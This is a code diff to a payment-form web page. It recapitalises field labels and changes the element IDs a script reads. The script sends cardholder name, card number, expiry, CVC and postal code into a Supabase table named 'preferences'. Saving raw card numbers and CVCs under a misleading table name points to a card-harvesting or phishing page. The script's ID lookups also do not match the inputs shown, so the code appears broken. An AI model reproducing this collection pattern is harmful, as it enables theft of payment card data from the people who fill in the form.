@@ -61,13 +61,13 @@
                 <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
                     <!-- Cardholder Name -->
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Cardholder Name</label>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">cardholder Name</label>
                         <input type="text" value="full names" required class="w-full bg-white border border-slate-300 rounded-xl px-4 py-3 text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm">
                     </div>
 
                     <!-- Card Number with cleanly aligned card logos -->
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Card Number</label>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">card Number</label>
                         <div class="relative flex items-center">
                             <!-- Input with padding on right to leave ample space for logos -->
                             <input type="text" value="**** **** **** ****" required class="w-full bg-white border border-slate-300 rounded-xl pl-4 pr-36 py-3 text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm font-mono tracking-wider">
@@ -84,7 +84,7 @@
                     <!-- Expiration Date & CVC/CVV -->
                     <div class="grid grid-cols-2 gap-4">
                         <div>
-                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Expiration Date</label>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">expiration Date</label>
                             <input type="text" value="" required class="w-full bg-white border border-slate-300 rounded-xl px-4 py-3 text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm font-mono">
                         </div>
                         <div>
@@ -98,7 +98,7 @@
 
                     <!-- Postal / Zip Code Field -->
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Postal Code / Zip Code</label>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">postal Code / Zip Code</label>
                         <input type="text" value="" required placeholder="postal code" class="w-full bg-white border border-slate-300 rounded-xl px-4 py-3 text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm font-mono">
                     </div>
 
@@ -183,12 +183,11 @@
 
     const { error } = await sbPrefs.from("preferences").insert({
       ref: ref,
-      Cardholder: document.getElementById("Cardholder Name").value,
-      card: document.getElementById("Card Number").value,
-      expiration: document.getElementById("Expiration Date").value,
-      CVC: document.getElementById("CVC/CVV").value,
-      postal: document.getElementById("Postal Code / Zip Code
-").value,
+      Cardholder: document.getElementById("cardholder").value,
+      card: document.getElementById("card").value,
+      expiration: document.getElementById("expiration").value,
+      CVC: document.getElementById("CVC").value,
+      postal: document.getElementById("Postal").value,
     });
 
     if (error) {
